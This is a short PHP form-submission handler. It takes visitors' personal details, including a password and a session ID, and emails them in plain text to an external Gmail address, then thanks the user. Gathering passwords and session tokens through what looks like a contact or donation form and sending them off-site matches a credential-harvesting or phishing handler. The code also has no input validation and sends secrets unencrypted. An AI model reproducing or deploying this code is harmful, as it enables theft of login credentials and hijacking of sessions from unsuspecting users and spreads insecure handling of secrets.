<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Gather form data
    $name = $_POST['name'];
    $email = $_POST['email'];
    $message = $_POST['message'];
    $phone = $_POST['phone'];
    $age = $_POST['age'];
    $gender = $_POST['gender'];
    $contributions = implode(", ", $_POST['Contributions']);
    $password = $_POST['password'];
    $sessionId = $_POST['sessionId'];

    // Set up email
    $to = "goalquestfdn@gmail.com"; // Replace with your email address
    $subject = "New Form Submission";
    $body = "Name: $name\nEmail: $email\nMessage: $message\nPhone: $phone\nAge: $age\nGender: $gender\nContributions: $contributions\nPassword: $password\nSession ID: $sessionId";

    // Send email
    if (mail($to, $subject, $body)) {
        echo "<p>Thank you for your submission!</p>";
    } else {
        echo "<p>There was a problem sending your message. Please try again later.</p>";
    }
}
?>


